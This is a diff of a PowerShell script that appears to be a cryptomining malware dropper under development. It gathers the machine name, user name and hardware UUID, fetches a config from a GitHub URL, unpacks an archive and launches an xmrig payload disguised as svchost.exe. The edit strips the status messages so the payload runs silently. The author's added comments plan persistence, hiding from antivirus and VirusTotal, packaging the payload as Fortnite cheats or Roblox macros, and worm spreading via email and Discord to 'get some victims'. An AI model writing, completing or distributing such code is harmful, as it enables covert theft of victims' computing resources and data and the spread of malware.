@@ -1,3 +1,16 @@
+# persistence needed (fileless registry persistence?)
+# make xmrig undetected somehow (fileless miner ?) however it does detect the process not the actual file, so just i reckon make the process hidden (run it as admin so its not killable in task manager)
+# dont display the cmd window
+# make xmrig not be a blank screen but just not appear
+# package it up into some cheats for fortnite or sum
+# maybe roblox macros 
+# fix virus total (add loads of gobbeldy gook vars in original.ps1)
+# remove these comments lmao
+# make the webhook url encoded b64 so script kiddies cant spam that shit
+# get some victims.
+# spread via email and discord 
+# be a good little worm...
+
 $pcName     = $env:COMPUTERNAME;
 $userName   = $env:USERNAME;
 $uuid       = (Get-WmiObject Win32_ComputerSystemProduct).UUID;
@@ -67,11 +80,9 @@ if ($gpu -match "nvidia|gtx|rtx|geforce") {
     $exePath = Join-Path $extractPath "System Utilities\svchost.exe"
 
     if (Test-IsAdmin) {
-        Start-Process -FilePath $exePath -Verb RunAs
-        Write-Host "EXE launched as administrator."
+        & $exePath
     } else {
-        Start-Process $exePath -ArgumentList "--background"
-        Write-Host "EXE launched without elevation."
+        & $exePath -ArgumentList "--background"
     }
 }
 else{
@@ -88,7 +99,6 @@ else{
     $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
     if (Test-Path $extractPath) {Remove-Item -Recurse -Force $extractPath;};
     Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
-    Write-Host "ZIP file extracted to $extractPath";
     $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
     $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
     $configPath = "$deepExtractPath\config.json";
@@ -99,10 +109,8 @@ else{
     rm $zipFilePath
     $exePath = Join-Path $extractPath "System Utilities\svchost.exe";
     if (Test-IsAdmin) {
-        Start-Process -FilePath $exePath -Verb RunAs
-        Write-Host "EXE launched as administrator."
+        & $exePath
     } else {
-        Start-Process $exePath
-        Write-Host "EXE launched without elevation."
+        & $exePath
     }
 }
